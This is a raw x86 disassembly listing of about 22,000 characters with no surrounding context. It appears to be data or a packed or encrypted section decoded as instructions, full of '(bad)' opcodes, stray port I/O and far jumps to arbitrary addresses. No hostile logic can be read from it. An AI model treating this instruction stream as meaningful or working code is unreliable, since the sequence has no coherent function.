  405655:	(bad)  
  405656:	inc    eax
  405657:	xlat   BYTE PTR ds:[ebx]
  405658:	jmp    0x4056a5
  40565a:	out    0x38,al
  40565c:	xlat   BYTE PTR ds:[ebx]
  40565d:	sbb    eax,0x59aa5286
  405662:	sbb    ah,BYTE PTR [edx+0x66]
  405665:	cmp    BYTE PTR [ebx+esi*4+0x2d7d919a],0x50
  40566d:	push   0x1e42bfe5
  405672:	sbb    BYTE PTR [ebp+0x3d],cl
  405675:	inc    ebp
  405676:	rcl    dh,1
  405678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405679:	inc    esi
  40567a:	xor    esp,DWORD PTR [eax+0x33]
  40567d:	pop    ecx
  40567e:	push   esp
  40567f:	arpl   WORD PTR [edx+0x53],si
  405682:	mov    ecx,DWORD PTR [edi+0x6d06bba8]
  405688:	fistp  DWORD PTR [edi-0x66a0870a]
  40568e:	jae    0x40569c
  405690:	dec    edi
  405691:	inc    esp
  405692:	cmp    eax,0x33ece3e8
  405697:	repnz xlat BYTE PTR ds:[ebx]
  405699:	in     eax,0xb4
  40569b:	sbb    al,0x37
  40569d:	sub    al,0x12
  40569f:	push   ebx
  4056a0:	mov    edx,0x290ab943
  4056a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056a6:	cmp    BYTE PTR [ebp-0x54],0x55
  4056aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056ab:	xor    eax,0x3f22e2f4
  4056b0:	imul   ebx,DWORD PTR [ecx-0x6e679db],0x1c
  4056b7:	or     edi,DWORD PTR [ebx+0x34750866]
  4056bd:	adc    al,0xc0
  4056bf:	sub    eax,0xf286bdfe
  4056c4:	xchg   BYTE PTR [edx],ah
  4056c6:	push   edx
  4056c7:	(bad)  
  4056c8:	sbb    dh,BYTE PTR [ebx-0x2d]
  4056cb:	push   0x80c44a63
  4056d0:	sbb    DWORD PTR [ecx+0x6e],edx
  4056d3:	rcr    dl,1
  4056d5:	call   0x179f48f0
  4056da:	(bad)  
  4056db:	inc    esi
  4056dc:	popw   es
  4056de:	je     0x4056b8
  4056e0:	push   esi
  4056e1:	adc    BYTE PTR [ecx+ebp*2-0x3d1a02fc],dl
  4056e8:	mov    BYTE PTR [edx-0x4182cb90],bl
  4056ee:	xchg   esp,eax
  4056ef:	imul   BYTE PTR [edx+0x6c5a13a3]
  4056f5:	sbb    eax,0x3367ac33
  4056fa:	aam    0xad
  4056fc:	and    BYTE PTR [ecx-0x2930325a],ah
  405702:	enter  0xe4d6,0x9b
  405706:	repz loopne 0x4056f5
  405709:	sub    WORD PTR [eax-0x1499cacf],si
  405710:	or     eax,0xbf59c634
  405715:	mov    ah,0xa0
  405717:	sub    esp,DWORD PTR [ebx]
  405719:	adc    DWORD PTR [edx+eiz*2-0x71],ecx
  40571d:	or     al,BYTE PTR [ebx+0x74]
  405720:	push   ecx
  405721:	mov    ebp,0xa6407a8a
  405726:	and    al,0x3
  405728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405729:	and    esp,eax
  40572b:	xchg   ecx,eax
  40572c:	mov    eax,ds:0x7dd80046
  405731:	test   al,0xfd
  405733:	retf   0xa32c
  405736:	bnd jp 0x4056d9
  405739:	ret    0xe9a
  40573c:	call   0x79d5:0x8b23a3a4
  405743:	outs   dx,DWORD PTR ds:[esi]
  405744:	push   cs
  405745:	jns    0x4056e9
  405747:	inc    edx
  405748:	inc    ebx
  405749:	into   
  40574a:	or     DWORD PTR [eax-0x71],ebx
  40574d:	mov    bl,0x24
  40574f:	mov    BYTE PTR [ebx],0x75
  405752:	pop    ss
  405753:	enter  0xa185,0xec
  405757:	aam    0x90
  405759:	or     DWORD PTR [eax],ebp
  40575b:	mov    eax,ds
  40575d:	scas   eax,DWORD PTR es:[edi]
  40575e:	fcom   DWORD PTR [edx-0x59]
  405761:	popf   
  405762:	push   ds
  405763:	inc    eax
  405764:	lahf   
  405765:	clc    
  405766:	mov    esi,0x3f7b9602
  40576b:	cwde   
  40576c:	jbe    0x4057ac
  40576e:	mov    bh,0xcc
  405770:	pop    esp
  405771:	cld    
  405772:	fwait
  405773:	lods   eax,DWORD PTR ds:[esi]
  405774:	or     al,0x79
  405776:	pop    ds
  405777:	sub    DWORD PTR [ecx-0x45c3b39f],0x2d
  40577e:	and    eax,DWORD PTR [edi+0x16]
  405781:	mov    edi,0x74d2cc98
  405786:	fistp  QWORD PTR [ebx+0x35]
  405789:	xlat   BYTE PTR ds:[ebx]
  40578a:	jp     0x4057ca
  40578c:	in     al,0x5d
  40578e:	sbb    cl,cl
  405790:	arpl   WORD PTR [ecx-0x63],si
  405793:	ja     0x40578b
  405795:	mov    dl,0xa3
  405797:	lods   al,BYTE PTR ds:[esi]
  405798:	inc    ebx
  405799:	push   ss
  40579a:	add    cl,BYTE PTR [ebx]
  40579c:	add    al,0x9a
  40579e:	cmc    
  40579f:	mov    ds:0xd716cdb3,eax
  4057a4:	pop    es
  4057a5:	into   
  4057a6:	and    eax,ebx
  4057a8:	add    BYTE PTR [edi],bl
  4057aa:	inc    esp
  4057ab:	out    dx,al
  4057ac:	pushf  
  4057ad:	inc    eax
  4057ae:	cmp    BYTE PTR [ecx-0x3e],bl
  4057b1:	mov    dh,bl
  4057b3:	popa   
  4057b4:	mov    eax,ds:0xb35c17a8
  4057b9:	xor    ch,cl
  4057bb:	jmp    0xdf0bf9db
  4057c0:	fstp   DWORD PTR [edi-0x2d]
  4057c3:	sub    ch,BYTE PTR [edx]
  4057c5:	add    DWORD PTR [ecx-0x7f60776c],eax
  4057cb:	and    dl,dl
  4057cd:	xor    DWORD PTR [edx-0x22],edi
  4057d0:	leave  
  4057d1:	lds    ebx,FWORD PTR [eax+0x73f48b78]
  4057d7:	hlt    
  4057d8:	int3   
  4057d9:	cmp    ch,ah
  4057db:	jmp    0x75e2b489
  4057e0:	sub    eax,0x3f1ff4dc
  4057e5:	icebp  
  4057e6:	out    dx,eax
  4057e7:	mov    dh,0xa7
  4057e9:	dec    eax
  4057ea:	xor    ebp,esi
  4057ec:	(bad)  
  4057ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057ef:	add    DWORD PTR [eax],eax
  4057f1:	jno    0x405868
  4057f3:	pop    eax
  4057f4:	or     eax,0x541ea90f
  4057f9:	jl     0x4057f5
  4057fb:	jge    0x40581f
  4057fd:	in     al,0x3f
  4057ff:	(bad)  
  405800:	jo     0x4057d9
  405802:	cmp    ebx,DWORD PTR [edi-0x528feab7]
  405808:	icebp  
  405809:	cwde   
  40580a:	jp     0x4057b1
  40580c:	pop    ebp
  40580d:	jnp    0x4057b1
  40580f:	popa   
  405810:	ins    DWORD PTR es:[edi],dx
  405811:	lds    ebp,FWORD PTR [edi+0x7f952594]
  405817:	retf   
  405818:	out    dx,al
  405819:	ins    DWORD PTR es:[edi],dx
  40581a:	xlat   BYTE PTR ds:[ebx]
  40581b:	mov    bh,0xf9
  40581d:	jp     0x4057b9
  40581f:	or     bh,dh
  405821:	mov    eax,ds:0xd43eee91
  405826:	lea    esp,[esi]
  405828:	loop   0x405823
  40582a:	and    al,BYTE PTR [ecx+esi*2+0xbed0799]
  405831:	add    BYTE PTR [edi+0x153fd4d1],al
  405837:	shl    BYTE PTR [eax],cl
  405839:	xchg   esi,eax
  40583a:	lahf   
  40583b:	jmp    0x40584b
  40583d:	cmp    eax,0xf2a246b8
  405842:	dec    ebp
  405843:	fcomp  QWORD PTR [edi-0x585095f2]
  405849:	enter  0xbafa,0x7f
  40584d:	jge    0x4057e1
  40584f:	scas   al,BYTE PTR es:[edi]
  405850:	jmp    0xb33c:0xf1b81247
  405857:	and    DWORD PTR [edx+0x1e67493a],edx
  40585d:	and    eax,0xf5f7c20e
  405862:	mov    ds:0x85bc813d,eax
  405867:	jae    0x405851
  405869:	into   
  40586a:	sbb    eax,0x65ac8d8
  40586f:	sub    BYTE PTR gs:[eax],0xb3
  405873:	aad    0x9a
  405875:	cmp    al,ch
  405877:	jecxz  0x4058f7
  405879:	xchg   esp,eax
  40587a:	ret    0xf0a5
  40587d:	gs leave 
  40587f:	xor    ebx,DWORD PTR [ebp-0xd]
  405882:	mov    esp,0xa22f50b8
  405887:	outs   dx,BYTE PTR ds:[esi]
  405888:	inc    BYTE PTR [edi]
  40588a:	enter  0x7672,0x50
  40588e:	shl    DWORD PTR [esp+eax*4-0x59e8cfe3],1
  405895:	mov    BYTE PTR [ebp+0x4b4e89b],bl
  40589b:	enter  0x47b7,0x3a
  40589f:	mov    cl,0xa5
  4058a1:	mov    ch,0xf1
  4058a3:	not    DWORD PTR [esi-0x1ed12dab]
  4058a9:	jns    0x4058fc
  4058ab:	pop    ecx
  4058ac:	sub    cl,bl
  4058ae:	adc    DWORD PTR [edx+0x67537671],edi
  4058b4:	xchg   DWORD PTR [ebx],eax
  4058b6:	icebp  
  4058b7:	pop    eax
  4058b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058b9:	shr    BYTE PTR [esp+ebp*2],1
  4058bc:	add    DWORD PTR [ebx],edx
  4058be:	retf   0x640f
  4058c1:	rcl    BYTE PTR [ebx+eiz*1],0x75
  4058c5:	mov    bl,0x22
  4058c7:	std    
  4058c8:	or     cl,cl
  4058ca:	mov    ebp,0x7e9b450a
  4058cf:	inc    di
  4058d1:	sbb    eax,0x1c9e9aea
  4058d6:	sbb    ecx,ebx
  4058d8:	sti    
  4058d9:	lods   eax,DWORD PTR ds:[esi]
  4058da:	dec    ebp
  4058db:	sub    BYTE PTR [edx+0x2b13b305],ah
  4058e1:	pop    esi
  4058e2:	or     ebp,DWORD PTR [ecx+0x3699d79a]
  4058e8:	jecxz  0x405953
  4058ea:	adc    eax,0xa8ac5247
  4058ef:	(bad)  
  4058f1:	adc    bh,al
  4058f3:	dec    ebx
  4058f4:	cmp    BYTE PTR [esi],dh
  4058f6:	cmp    DWORD PTR [edx+0x4b11a021],esi
  4058fc:	lea    edi,ds:0x7686869c
  405902:	push   ecx
  405903:	mov    dl,0x9b
  405905:	mov    esp,0x402800dc
  40590a:	mov    dl,0x9f
  40590c:	popf   
  40590d:	lahf   
  40590e:	fld    st(2)
  405910:	adc    eax,DWORD PTR [ebx+0x62655f45]
  405916:	mov    al,ds:0x6d57229
  40591b:	mov    dh,0x44
  40591d:	mov    WORD PTR [edi+0x10744243],gs
  405923:	jle    0x4058e5
  405925:	inc    eax
  405926:	xchg   DWORD PTR [ecx+edi*8],esp
  405929:	enter  0x36df,0xdb
  40592d:	jb     0x40599a
  40592f:	rol    DWORD PTR [ecx-0x45],1
  405932:	xchg   edi,eax
  405933:	xchg   edi,eax
  405934:	clc    
  405935:	xor    DWORD PTR [ecx+0x3d3e0547],edx
  40593b:	fdivr  QWORD PTR [esi+ebp*2]
  40593e:	or     al,0x8b
  405940:	sub    DWORD PTR [ebx+0x37803b50],edx
  405946:	fdiv   QWORD PTR [ecx-0x67]
  405949:	sub    eax,0x4778fd44
  40594e:	pop    es
  40594f:	jp     0x4059af
  405951:	jmp    0xef89d4e2
  405956:	mov    WORD PTR [eax+eax*2+0x32836590],cs
  40595d:	adc    dh,BYTE PTR [edi+0x5d575be7]
  405963:	mov    bh,0x15
  405965:	push   ebp
  405966:	pop    ebx
  405967:	add    al,0x1c
  405969:	adc    BYTE PTR [esi+0x7b],0x14
  40596d:	(bad)  
  40596e:	icebp  
  40596f:	jle    0x4059bb
  405971:	mov    esp,0xfde40e3a
  405976:	push   ebp
  405977:	xor    dl,dh
  405979:	pop    ebx
  40597a:	pop    ds
  40597b:	adc    esi,DWORD PTR [esi]
  40597d:	mov    esi,0x12c3522c
  405982:	or     eax,0x2914bddb
  405987:	mov    ds:0x48ec2d2a,al
  40598c:	pop    es
  40598d:	pop    eax
  40598e:	xchg   edi,eax
  40598f:	pop    edx
  405990:	jns    0x405961
  405992:	inc    ebp
  405993:	scas   al,BYTE PTR es:[edi]
  405994:	add    BYTE PTR [esi+0x63b34c43],bl
  40599a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40599b:	inc    edx
  40599c:	sahf   
  40599d:	vpsrlw xmm5,xmm1,xmm2
  4059a1:	mov    ebx,0xf4f61ffe
  4059a6:	push   esp
  4059a7:	ins    DWORD PTR es:[edi],dx
  4059a8:	pop    ebx
  4059a9:	lods   eax,DWORD PTR ds:[esi]
  4059aa:	adc    BYTE PTR [esi+0x65],bh
  4059ad:	test   al,0xae
  4059af:	lods   al,BYTE PTR ds:[esi]
  4059b0:	pop    ebp
  4059b1:	mov    dl,0x10
  4059b3:	lods   al,BYTE PTR ds:[esi]
  4059b4:	call   0xc4f31727
  4059b9:	pop    esp
  4059ba:	or     al,0xd4
  4059bc:	xchg   edx,eax
  4059bd:	(bad)  
  4059be:	jmp    0x5788:0x17bc42b0
  4059c5:	inc    ecx
  4059c6:	(bad)  
  4059c7:	jmp    0x8af3e395
  4059cc:	sbb    eax,0x24cc524
  4059d1:	mul    ah
  4059d3:	fdivr  QWORD PTR [eax+0x383c7e25]
  4059d9:	in     al,dx
  4059da:	js     0x405993
  4059dc:	pop    ebp
  4059dd:	(bad)  
  4059de:	fistp  QWORD PTR [si-0xd8b]
  4059e3:	cmp    al,0x1
  4059e5:	jns    0x405a09
  4059e7:	dec    edi
  4059e8:	fwait
  4059e9:	ja     0x4059ad
  4059eb:	aad    0x95
  4059ed:	hlt    
  4059ee:	retf   
  4059ef:	mov    bh,BYTE PTR ss:[ecx+0x4c]
  4059f3:	or     bl,BYTE PTR [eax]
  4059f5:	outs   dx,BYTE PTR ds:[esi]
  4059f6:	cs ja  0x405a63
  4059f9:	push   es
  4059fa:	sbb    bh,BYTE PTR [edx+0x42]
  4059fd:	ret    
  4059fe:	jae    0x4059c0
  405a00:	test   al,0xce
  405a02:	aam    0xf1
  405a04:	les    edi,FWORD PTR [ebx]
  405a06:	hlt    
  405a07:	shr    DWORD PTR [edx+0x1d50c5a0],1
  405a0d:	push   ebp
  405a0e:	pop    edx
  405a0f:	icebp  
  405a10:	push   ebp
  405a11:	add    BYTE PTR [edi-0x67],dh
  405a14:	aam    0x44
  405a16:	cdq    
  405a17:	(bad)  
  405a18:	cmp    esp,edx
  405a1a:	call   0x315fc00d
  405a1f:	sbb    BYTE PTR [edx-0x3c925ec2],0xcc
  405a26:	fs fdivrp st(7),st
  405a29:	loope  0x4059f7
  405a2b:	mov    WORD PTR [ecx-0x47],cs
  405a2e:	push   eax
  405a2f:	fdivr  DWORD PTR [ebp+edx*8+0x331a6682]
  405a36:	or     ecx,esi
  405a38:	mov    DWORD PTR [edi+0x5],esp
  405a3b:	in     al,0x1b
  405a3d:	pop    edx
  405a3e:	ins    DWORD PTR es:[edi],dx
  405a3f:	retf   
  405a40:	lds    edx,FWORD PTR [esi-0x2f]
  405a43:	icebp  
  405a44:	ins    BYTE PTR es:[edi],dx
  405a45:	cmp    DWORD PTR [ecx-0x4a9d9d28],edi
  405a4b:	xchg   ebp,eax
  405a4c:	pop    ecx
  405a4d:	mov    esi,0xfdb3ccd0
  405a52:	xor    dl,BYTE PTR [ebp-0x3f]
  405a55:	push   esi
  405a56:	jo     0x405a39
  405a58:	icebp  
  405a59:	into   
  405a5a:	(bad)  
  405a5b:	shr    DWORD PTR [ebx+0x15ef601e],cl
  405a61:	jae    0x405a06
  405a63:	loop   0x4059e6
  405a65:	jge    0x405a35
  405a67:	mov    bl,BYTE PTR [edi+0x519eae35]
  405a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a6e:	mov    edx,0xfe860d2b
  405a73:	pop    ebx
  405a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a75:	sbb    eax,0xe4fe4f21
  405a7a:	int    0xfd
  405a7c:	jno    0x405aea
  405a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a7f:	lahf   
  405a80:	mov    ah,0x17
  405a82:	cmp    esi,DWORD PTR ds:0x6a951c06
  405a88:	push   ss
  405a89:	sbb    edx,DWORD PTR [ebp+0x4e]
  405a8c:	retf   0x62e
  405a8f:	xchg   ebp,eax
  405a90:	push   eax
  405a91:	jno    0x405a71
  405a93:	mov    ch,0x35
  405a95:	push   edi
  405a96:	and    ch,dh
  405a98:	mov    DWORD PTR [ebx-0x45015dfb],ebx
  405a9e:	mov    dl,0xb1
  405aa0:	(bad)  
  405aa1:	ror    dl,0xc5
  405aa4:	xor    eax,0x90d9f005
  405aa9:	jecxz  0x405adc
  405aab:	cmp    al,0xc0
  405aad:	dec    esp
  405aae:	out    dx,eax
  405aaf:	jo     0x405aa5
  405ab1:	jo     0x405b16
  405ab3:	inc    edi
  405ab4:	fmul   st(5),st
  405ab6:	hlt    
  405ab7:	cdq    
  405ab8:	(bad)  
  405ab9:	outs   dx,BYTE PTR ds:[esi]
  405aba:	inc    ebp
  405abb:	cmp    ah,dh
  405abd:	neg    BYTE PTR [edx]
  405abf:	or     al,ah
  405ac1:	push   cs
  405ac2:	dec    edx
  405ac3:	pop    es
  405ac4:	test   al,0xb9
  405ac6:	fcomp  DWORD PTR [eax]
  405ac8:	pop    ss
  405ac9:	mov    edi,0x2e190071
  405ace:	push   ebx
  405acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ad0:	add    edi,DWORD PTR [edx]
  405ad2:	std    
  405ad3:	sbb    edx,edi
  405ad5:	aaa    
  405ad6:	xor    al,BYTE PTR [ebx+0x1681f74d]
  405adc:	arpl   WORD PTR [eax-0x7e],ax
  405adf:	mov    es,WORD PTR [esi]
  405ae1:	push   ebx
  405ae2:	scas   eax,DWORD PTR es:[edi]
  405ae3:	retf   0xa8fb
  405ae6:	jnp    0x405b4c
  405ae8:	hlt    
  405ae9:	es aam 0x20
  405aec:	push   edx
  405aed:	fdiv   QWORD PTR [ebx-0x70]
  405af0:	scas   eax,DWORD PTR es:[edi]
  405af1:	in     eax,0xe9
  405af3:	pop    esi
  405af4:	arpl   WORD PTR [esi],cx
  405af6:	jp     0x405b3e
  405af8:	sbb    eax,0xe98ec1c1
  405afd:	push   eax
  405afe:	jne    0x405ac4
  405b00:	out    0xcd,al
  405b02:	es push eax
  405b04:	popa   
  405b05:	fndisi(8087 only) 
  405b07:	inc    esp
  405b08:	in     al,0xf2
  405b0a:	sub    cl,cl
  405b0c:	sub    al,dh
  405b0e:	scas   al,BYTE PTR es:[edi]
  405b0f:	mov    ch,0x9f
  405b11:	and    BYTE PTR [esi],dh
  405b13:	jb     0x405af4
  405b15:	xor    bh,dl
  405b17:	cmp    BYTE PTR [ebx],0xbb
  405b1a:	and    BYTE PTR [eax-0x14],ch
  405b1d:	ret    0x75f0
  405b20:	dec    ebx
  405b21:	(bad)  
  405b22:	repnz xlat BYTE PTR ds:[ebx]
  405b24:	mov    ds:0x17bdca33,al
  405b29:	cwde   
  405b2a:	inc    edi
  405b2b:	mov    dl,0xe2
  405b2d:	mov    ebp,0x49d232bd
  405b32:	xchg   ebp,eax
  405b33:	xor    eax,0xdc5a89a4
  405b38:	imul   edi,DWORD PTR ds:[ecx-0x235faaa7],0xffffffaa
  405b40:	pop    ecx
  405b41:	add    ch,dh
  405b43:	test   eax,0x20cd0f8
  405b48:	ins    DWORD PTR es:[edi],dx
  405b49:	or     al,0x6
  405b4b:	jle    0x405aeb
  405b4d:	xor    dl,BYTE PTR [edx-0x75e50e5e]
  405b53:	lds    ecx,FWORD PTR [ebx]
  405b55:	ds or  eax,0x662c576a
  405b5b:	in     al,dx
  405b5c:	in     eax,0xb1
  405b5e:	pop    esi
  405b5f:	push   ebp
  405b60:	int3   
  405b61:	inc    esp
  405b62:	or     dl,BYTE PTR [ecx-0x366607f]
  405b68:	add    bl,ah
  405b6a:	xor    eax,0xd69bddbd
  405b6f:	into   
  405b70:	mov    dl,0x41
  405b72:	in     al,0x8a
  405b74:	icebp  
  405b75:	fcomp  DWORD PTR [ebx+0x6e]
  405b78:	adc    al,0x6c
  405b7a:	jne    0x405b88
  405b7c:	scas   eax,DWORD PTR es:[edi]
  405b7d:	stc    
  405b7e:	lahf   
  405b7f:	mov    dh,0x63
  405b81:	pop    ss
  405b82:	sub    al,0x3
  405b84:	cmp    DWORD PTR [edx],ecx
  405b86:	pushf  
  405b87:	mov    eax,0xc800a4c7
  405b8c:	dec    ebp
  405b8d:	sbb    eax,0x974d1c9
  405b92:	push   edx
  405b93:	xchg   ebp,eax
  405b94:	stos   BYTE PTR es:[edi],al
  405b95:	aad    0x77
  405b97:	dec    edi
  405b98:	sub    esp,esp
  405b9a:	xor    ah,bl
  405b9c:	xchg   ebx,eax
  405b9d:	sbb    dl,BYTE PTR [edx]
  405b9f:	push   ecx
  405ba0:	mov    ecx,0x49cffc5f
  405ba5:	aam    0xe8
  405ba7:	pop    ecx
  405ba8:	xor    DWORD PTR [ebx],0x5e5ee0b
  405bae:	pushf  
  405baf:	xchg   BYTE PTR [esi+ebp*2+0x25db5448],dl
  405bb6:	loop   0x405c02
  405bb8:	(bad)  
  405bb9:	fs mov edx,0xb748cc92
  405bbf:	mov    ds:0x84c62963,eax
  405bc4:	call   0x4acc:0x7358ccc
  405bcb:	mov    bh,0xd1
  405bcd:	add    eax,0x1298b9d3
  405bd2:	push   ss
  405bd3:	pushf  
  405bd4:	jbe    0x405b58
  405bd6:	arpl   WORD PTR [eax-0x50],dx
  405bd9:	pop    ss
  405bda:	push   ecx
  405bdb:	pop    esi
  405bdc:	sbb    edi,DWORD PTR [edi+0x47]
  405bdf:	rol    BYTE PTR [ecx],1
  405be1:	leave  
  405be2:	xchg   DWORD PTR [ebp-0x89ad503],eax
  405be8:	(bad)  
  405be9:	mov    edx,0xb937d874
  405bee:	jmp    0x405bfe
  405bf0:	xor    DWORD PTR [edi-0x5f8c392c],esi
  405bf6:	mov    ebp,0xc9a69f3f
  405bfb:	fdiv   QWORD PTR [ebp+0x531053cb]
  405c01:	mov    cl,0x36
  405c03:	inc    ebx
  405c04:	dec    DWORD PTR [ebx+0x0]
  405c07:	ins    BYTE PTR es:[edi],dx
  405c08:	pop    ebx
  405c09:	mov    eax,0xa01478f5
  405c0e:	hlt    
  405c0f:	mov    dh,0x1d
  405c11:	push   cs
  405c12:	cmp    ah,BYTE PTR [eax]
  405c14:	call   0xc8fd:0xe2a1e2d6
  405c1b:	das    
  405c1c:	not    DWORD PTR [eax+ebp*4-0x6e]
  405c20:	loopne 0x405ba9
  405c22:	push   ebx
  405c23:	cmp    esi,DWORD PTR [ecx+ecx*4-0x71d6d88b]
  405c2a:	shl    DWORD PTR [ebp+0x12a388f3],0x76
  405c31:	push   0xe3451e9b
  405c36:	add    ebx,DWORD PTR [ebx+0x5c]
  405c39:	dec    edi
  405c3a:	ror    BYTE PTR [ebp-0x5c],0xf5
  405c3e:	mov    esp,0xb2427e3d
  405c43:	fisub  DWORD PTR [esi+0x47c5cf0b]
  405c49:	scas   al,BYTE PTR es:[edi]
  405c4a:	mov    ds:0x8cbb7402,al
  405c4f:	jg     0x405c08
  405c51:	mov    WORD PTR [esi],gs
  405c53:	in     eax,dx
  405c54:	mov    ah,0x95
  405c56:	imul   edx,esp,0x44
  405c59:	add    bh,0xf5
  405c5c:	or     bh,BYTE PTR [edx]
  405c5e:	add    BYTE PTR [eax-0x2b28b06d],dl
  405c64:	sub    DWORD PTR [eax],esi
  405c66:	jmp    0x405c0e
  405c68:	jmp    0x5e54:0xe7a05eda
  405c6f:	dec    edx
  405c70:	ins    BYTE PTR es:[edi],dx
  405c71:	push   edx
  405c72:	dec    ecx
  405c73:	inc    esi
  405c74:	push   ds
  405c75:	sbb    BYTE PTR [eax+0x2b],ah
  405c78:	cs inc edx
  405c7a:	nop
  405c7b:	sub    BYTE PTR [edi-0x61d38d4c],0xa0
  405c82:	ja     0x405c88
  405c84:	in     al,dx
  405c85:	or     DWORD PTR [esi+0x44d989e3],edx
  405c8b:	imul   ebp,ebp,0xffffffdf
  405c8e:	adc    BYTE PTR [eax],ah
  405c90:	out    dx,eax
  405c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c92:	pusha  
  405c93:	call   0x791aedbc
  405c98:	cmp    eax,0x27c3aced
  405c9d:	aas    
  405c9e:	int3   
  405c9f:	jnp    0x405c26
  405ca1:	clc    
  405ca2:	rol    DWORD PTR [ebp+0x11],0x36
  405ca6:	popa   
  405ca7:	sbb    al,0x1f
  405ca9:	aas    
  405caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cab:	test   DWORD PTR [ebx-0x53],ebp
  405cae:	dec    eax
  405caf:	and    edi,DWORD PTR [edi]
  405cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb2:	nop
  405cb3:	mov    BYTE PTR [edx],cl
  405cb5:	pop    ebx
  405cb6:	mov    ch,0xb0
  405cb8:	nop
  405cb9:	xchg   edi,eax
  405cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cbb:	inc    eax
  405cbc:	shl    edi,0x45
  405cbf:	scas   eax,DWORD PTR es:[edi]
  405cc0:	pop    ebx
  405cc1:	mov    fs,ecx
  405cc3:	sub    eax,0x2c91849f
  405cc8:	or     DWORD PTR [esi],ebp
  405cca:	in     eax,0x26
  405ccc:	push   edi
  405ccd:	adc    DWORD PTR [ebx+ebp*2-0x2f9e460d],eax
  405cd4:	dec    eax
  405cd5:	jo     0x405d01
  405cd7:	mov    ch,0x2d
  405cd9:	ret    0x5dd
  405cdc:	sbb    eax,0x21801846
  405ce1:	rcr    BYTE PTR ss:[edi],1
  405ce4:	cmp    esp,edi
  405ce6:	addr16 push ds
  405ce8:	outs   dx,DWORD PTR ds:[esi]
  405ce9:	push   0x4c
  405ceb:	sbb    ecx,ecx
  405ced:	cmp    eax,esp
  405cef:	jle    0x405cf8
  405cf1:	(bad)  
  405cf2:	aam    0x2e
  405cf4:	jl     0x405d0a
  405cf6:	mov    ecx,0xba33c926
  405cfb:	out    0x65,al
  405cfd:	dec    ebx
  405cfe:	ins    BYTE PTR es:[edi],dx
  405cff:	or     eax,0x7b18f2a
  405d04:	cmp    DWORD PTR [esi],ebp
  405d06:	inc    esi
  405d07:	sti    
  405d08:	xor    al,0x5
  405d0a:	repz int 0xd2
  405d0d:	test   al,0x2f
  405d0f:	cdq    
  405d10:	jo     0x405d19
  405d12:	(bad)  
  405d13:	push   edi
  405d14:	inc    ebp
  405d15:	and    al,0x97
  405d17:	jp     0x405d09
  405d19:	shl    ch,cl
  405d1b:	cmp    ah,BYTE PTR [ebx+0x3]
  405d1e:	sub    ebp,edi
  405d20:	or     al,0xde
  405d22:	stos   DWORD PTR es:[edi],eax
  405d23:	jmp    0x827b:0xa5952696
  405d2a:	out    dx,eax
  405d2b:	mov    esp,0x4a1fa4a4
  405d30:	shl    bl,cl
  405d32:	jo     0x405d85
  405d34:	jb     0x405cdc
  405d36:	data16 sbb cl,dh
  405d39:	out    0xc8,eax
  405d3b:	sahf   
  405d3c:	iret   
  405d3d:	repz jg 0x405da9
  405d40:	shl    DWORD PTR [edi-0x5d],0x9
  405d44:	retf   0x2ed
  405d47:	sahf   
  405d48:	or     DWORD PTR [bx+si+0x4477],edx
  405d4d:	mov    eax,ds:0xd697339d
  405d52:	in     al,dx
  405d53:	adc    edx,DWORD PTR [esi]
  405d55:	in     al,dx
  405d56:	jmp    0x597be502
  405d5b:	mov    ebp,0xcea2ac84
  405d60:	outs   dx,DWORD PTR ds:[esi]
  405d61:	pop    esp
  405d62:	push   ss
  405d63:	xchg   ecx,eax
  405d64:	mov    DWORD PTR [eax-0x75db0435],esi
  405d6a:	imul   ebp,ebx,0xe3462c4a
  405d70:	xor    dh,BYTE PTR [edx+0x67]
  405d73:	pop    es
  405d74:	cmc    
  405d75:	loop   0x405d2b
  405d77:	ret    
  405d78:	add    ch,BYTE PTR [eax+0x25]
  405d7b:	add    ebx,DWORD PTR [ebp+0x7d]
  405d7e:	push   ds
  405d7f:	inc    esi
  405d80:	aad    0x8a
  405d82:	jecxz  0x405d51
  405d84:	jae    0x405d8e
  405d86:	int3   
  405d87:	cwde   
  405d88:	and    BYTE PTR [eax-0x6073f4f3],ch
  405d8e:	inc    esi
  405d8f:	jecxz  0x405d76
  405d91:	sbb    BYTE PTR [edx*4-0x19463d99],bl
  405d98:	dec    ebp
  405d99:	sub    DWORD PTR [edi-0x17],edx
  405d9c:	clc    
  405d9d:	sbb    eax,0xb449a7b
  405da2:	out    dx,eax
  405da3:	or     al,0xb9
  405da5:	jmp    0xbd0b:0xa4a43f45
  405dac:	stos   DWORD PTR es:[edi],eax
  405dad:	test   al,0xa1
  405daf:	sub    cl,BYTE PTR [ebx-0x11]
  405db2:	xchg   DWORD PTR [edi-0x1a64b706],esp
  405db8:	mov    al,0xf2
  405dba:	push   edx
  405dbb:	mov    DWORD PTR [ecx+0x229a570d],edi
  405dc1:	push   ss
  405dc2:	dec    ebp
  405dc3:	xchg   ebx,eax
  405dc4:	xor    edi,ebp
  405dc6:	push   ebx
  405dc7:	adc    DWORD PTR [eax+0x3a],0x9829744c
  405dce:	pop    ebx
  405dcf:	lds    ebx,FWORD PTR [edi-0x30]
  405dd2:	aaa    
  405dd3:	sahf   
  405dd4:	stc    
  405dd5:	mul    BYTE PTR [edx]
  405dd7:	adc    bl,ah
  405dd9:	out    0xf5,al
  405ddb:	xor    DWORD PTR [ebx],0xe4616fd4
  405de1:	jno    0x405db3
  405de3:	xor    DWORD PTR fs:[edx+0x49],0x5295126
  405deb:	(bad)  
  405dec:	mov    ds:0x2e47f785,al
  405df1:	push   0xffffffec
  405df3:	test   al,0x7f
  405df5:	pop    ebx
  405df6:	and    cl,BYTE PTR [esi]
  405df8:	mov    ah,0xda
